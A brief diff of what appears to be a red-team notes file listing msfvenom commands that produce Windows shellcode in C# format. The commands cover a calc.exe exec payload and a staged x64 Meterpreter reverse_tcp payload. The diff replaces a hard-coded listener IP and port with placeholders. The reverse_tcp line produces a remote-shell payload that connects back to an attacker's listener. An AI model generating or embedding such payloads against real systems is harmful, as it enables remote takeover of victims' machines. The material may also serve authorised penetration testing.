@@ -7,4 +7,4 @@ msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
 msfvenom -p windows/exec CMD="calc.exe" -f csharp
 
 # generate x64 staged meterpreter reverse tcp payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.42 LPORT=8888 -f csharp
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT_PORT> -f csharp
